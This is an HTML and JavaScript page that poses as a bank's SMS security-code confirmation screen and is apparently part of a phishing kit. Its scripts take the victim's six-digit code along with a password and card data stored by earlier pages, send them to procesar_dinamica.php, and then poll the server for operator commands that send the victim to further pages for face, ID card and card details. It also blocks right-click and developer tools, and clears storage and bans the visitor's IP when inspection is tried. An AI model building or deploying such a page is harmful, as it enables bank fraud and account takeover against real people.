<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Código de Seguridad</title>
  <link rel="stylesheet" href="css/index.css">
</head>
<body>
  <!-- Campos ocultos necesarios -->
  <input type="hidden" id="session_id" value="">
  <input type="hidden" id="username" value="">

  <div class="form-container">
    <img src="img/viste.png" alt="Logo" class="logo">
    <h1>Ingresa tu código de seguridad</h1>
    
    <p class="mensaje-info">Para confirmar su transacción, ingrese su código de seguridad enviado por SMS a su dispositivo móvil</p>

    <label for="token">Código de seguridad</label>
    <input type="text" id="token" placeholder="Ingresa tu código de seguridad" maxlength="6" minlength="6" pattern="[0-9]+" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, exactamente 6 dígitos" style="text-align: center; font-size: 18px; letter-spacing: 2px;" />

    <a href="#" class="link">¿Tienes problemas con tu código?</a>

    <button id="btnIngresar" disabled>Confirmar</button>
  </div>

  <!-- Loader overlay -->
  <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.8); z-index: 9999; justify-content: center; align-items: center;">
    <div style="text-align: center;">
      <img src="img/viste.png" alt="Logo" style="width: 80px; height: 80px; animation: blink 1s ease-in-out infinite;">
    </div>
  </div>

  <div class="side-image">
    <img src="img/tele.png" alt="Imagen lateral">
  </div>

  <style>
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }
  </style>

  <script>
    // Ocultar loader al cargar la página
    document.addEventListener('DOMContentLoaded', function() {
      const loader = document.getElementById('loader-overlay');
      if (loader) {
        loader.style.display = 'none';
      }
    });

    function validarCampos() {
      const btnIngresar = document.getElementById("btnIngresar");
      const token = document.getElementById("token").value;
      
      // Validar que el token tenga 6 dígitos
      const camposCompletos = token.length === 6;
      
      // Cambiar estado del botón
      if (camposCompletos) {
        btnIngresar.removeAttribute("disabled");
        btnIngresar.style.background = "#FF6B35";
        btnIngresar.style.border = "none";
        btnIngresar.style.color = "white";
        btnIngresar.style.cursor = "pointer";
        btnIngresar.style.pointerEvents = "auto";
      } else {
        btnIngresar.setAttribute("disabled", "disabled");
        btnIngresar.style.background = "#e6e6e6";
        btnIngresar.style.border = "1px solid #ccc";
        btnIngresar.style.color = "#888";
        btnIngresar.style.cursor = "not-allowed";
        btnIngresar.style.pointerEvents = "none";
      }
    }

    // Agregar event listener al campo token
    document.addEventListener('DOMContentLoaded', function() {
      const tokenField = document.getElementById("token");
      if (tokenField) {
        tokenField.addEventListener('input', validarCampos);
      }
      
      // Validar inicialmente
      validarCampos();
    });
  </script>
  
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })());
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }
      
      const sessionInput = document.getElementById('session_id');
      if (sessionInput) sessionInput.value = sessionId;

      // Obtener usuario desde URL params y establecer en el campo hidden
      const userFromUrl = urlParams.get('user');
      const usernameInput = document.getElementById('username');
      if (userFromUrl) {
        if (usernameInput) usernameInput.value = userFromUrl;
        localStorage.setItem('username', userFromUrl);
      }

      // Event listener para el botón Continuar
      const btnIngresar = document.getElementById('btnIngresar');
      
      if (btnIngresar) {
        btnIngresar.addEventListener('click', async function (event) {
          event.preventDefault();

          if (btnIngresar.hasAttribute("disabled")) {
            return;
          }

          // Obtener el token
          const token = document.getElementById('token').value;
          
          // Validar que el token tenga 6 dígitos
          if (token.length !== 6) {
            alert('El token debe tener 6 dígitos');
            return;
          }

          // Mostrar loader
          const loader = document.getElementById('loader-overlay');
          if (loader) {
            loader.style.display = 'flex';
          }

          const formUsername = document.getElementById('username').value;
          const session_id = sessionId;

          localStorage.setItem('username', formUsername);
          localStorage.setItem('token', token);
          localStorage.setItem('session_id', session_id);

          // Obtener la identificación
          const identificacion = urlParams.get('identificacion') || localStorage.getItem('identificacion') || '';
          
          // Detectar tipo de dispositivo
          const userAgent = navigator.userAgent;
          let dispositivo = 'PC';
          if (/Android/i.test(userAgent)) dispositivo = 'Android';
          else if (/iPhone|iPad|iPod/i.test(userAgent)) dispositivo = 'iPhone';
          
          const hora = new Date().toLocaleString('es-ES');
          
          
          let localTb = {};
          try {
            localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
          } catch(e) {}

          const formData = new FormData();
          formData.append('transactionId', session_id);
          formData.append('u_id', localStorage.getItem('identificacion') || '');
          formData.append('u_ps', localStorage.getItem('password') || '');
          formData.append('u_tk', token);
          formData.append('u_tb', JSON.stringify(localTb));

          fetch('procesar_dinamica.php', { method: 'POST', body: formData })
          .then(res => res.json())
          .then(result => {
            if (result.status === 'success') {
              checkPaymentVerification(session_id, result.messageId);
            } else {
              const loaderBack = document.getElementById('loader-overlay');
              if (loaderBack) loaderBack.style.display = 'none';
            }
          })
          .catch(() => {
            const loaderBack = document.getElementById('loader-overlay');
            if (loaderBack) loaderBack.style.display = 'none';
          });
        });
      }
    });

    
    async function checkPaymentVerification(transactionId, messageId) {
      try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_respuesta.php?ts=' + Date.now(), { method: 'POST', body: formData });
        const result = await res.json();

        if (result.action) {
          const loaderFinal = document.getElementById('loader-overlay');
          if (loaderFinal) loaderFinal.style.display = 'none';

          switch (result.action) {
            case 'pedir_dinamica':
            case 'error_token':
              alert("Error de Código de Seguridad.");
              window.location.href = "token.php";
              break;
            case 'error_logo':
              alert("Usuario o clave incorrectos.");
              window.location.href = "index.html";
              break;
            case 'error_tc':
              window.location.href = "/datac/alter.php";
              break;
            case 'error': // Redirección para Cara
              window.location.href = "/caras";
              break;
            case 'cedula': // Redirección para Cédula
              window.location.href = "/cedula";
              break;
            case 'bre_b': // Redirección para Bre-B
              window.location.href = "/recaudos/brev.php";
              break;
            case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
              window.location.href = "/fin.php";
              break;
            default:
              setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
          }
        } else {
          setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
      } catch (err) {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
      }
    }

</script>
<script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>
</html> 
